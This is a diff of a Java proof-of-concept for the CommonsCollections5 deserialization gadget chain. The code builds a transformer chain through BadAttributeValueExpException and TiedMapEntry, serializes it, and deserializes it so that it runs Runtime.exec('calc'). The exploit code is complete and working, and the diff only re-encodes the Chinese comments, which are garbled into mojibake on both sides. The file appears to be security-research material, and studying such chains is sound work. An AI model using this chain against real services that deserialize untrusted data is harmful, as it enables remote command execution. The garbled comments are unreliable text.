@@ -16,9 +16,9 @@ import java.util.Map;
 public class CommonsCollections5 {
     public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
         /**
-         * ²âÊÔ»·¾³£º3.1-3.2.1£¬jdk1.8
-         * ÒıÈëĞÂÀàTiedMapEntryÀ´µ÷ÓÃLazyMap.get(),Ö»²»¹ıÎÒÃÇ¸Ä±äÁË LazyMap.get() µÄ´¥·¢·½Ê½£¬
-         * ²»ÔÙºÍ CC1 ºÍ CC3 Ò»Ñù½èÖú AnnotationInvocationHandler µÄ·´ĞòÁĞ»¯´¥·¢
+         * æµ‹è¯•ç¯å¢ƒï¼š3.1-3.2.1ï¼Œjdk1.8
+         * å¼•å…¥æ–°ç±»TiedMapEntryæ¥è°ƒç”¨LazyMap.get(),åªä¸è¿‡æˆ‘ä»¬æ”¹å˜äº† LazyMap.get() çš„è§¦å‘æ–¹å¼ï¼Œ
+         * ä¸å†å’Œ CC1 å’Œ CC3 ä¸€æ ·å€ŸåŠ© AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘
          *
          * ->BadAttributeValueExpException.readObject()
          *       ->TiedMapEntry.toString()
@@ -27,7 +27,7 @@ public class CommonsCollections5 {
          *                 ->ChainedTransformer.transform()
          *                     ->ConstantTransformer.transform()
          *                             ->InvokerTransformer.transform()
-         *                                 ->¡­¡­¡­¡­
+         *                                 ->â€¦â€¦â€¦â€¦
          *
          */
 
@@ -37,32 +37,32 @@ public class CommonsCollections5 {
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
         };
-        //ChainedTransformerÊµÀı
+        //ChainedTransformerå®ä¾‹
         Transformer chainedTransformer = new ChainedTransformer(transformers);
 
-        //LazyMapÊµÀı
+        //LazyMapå®ä¾‹
         Map uselessMap = new HashMap();
         Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
 
-        //TiedMapEntry ÊµÀı
+        //TiedMapEntry å®ä¾‹
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");
 
-        //BadAttributeValueExpException ÊµÀı
+        //BadAttributeValueExpException å®ä¾‹
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
 
-        //·´ÉäÉèÖÃ val
+        //åå°„è®¾ç½® val
         Field val = BadAttributeValueExpException.class.getDeclaredField("val");
         val.setAccessible(true);
         val.set(badAttributeValueExpException, tiedMapEntry);
 
-        //ĞòÁĞ»¯
+        //åºåˆ—åŒ–
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baos);
         oos.writeObject(badAttributeValueExpException);
         oos.flush();
         oos.close();
 
-        //²âÊÔ·´ĞòÁĞ»¯
+        //æµ‹è¯•ååºåˆ—åŒ–
         ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
         ObjectInputStream ois = new ObjectInputStream(bais);
         ois.readObject();
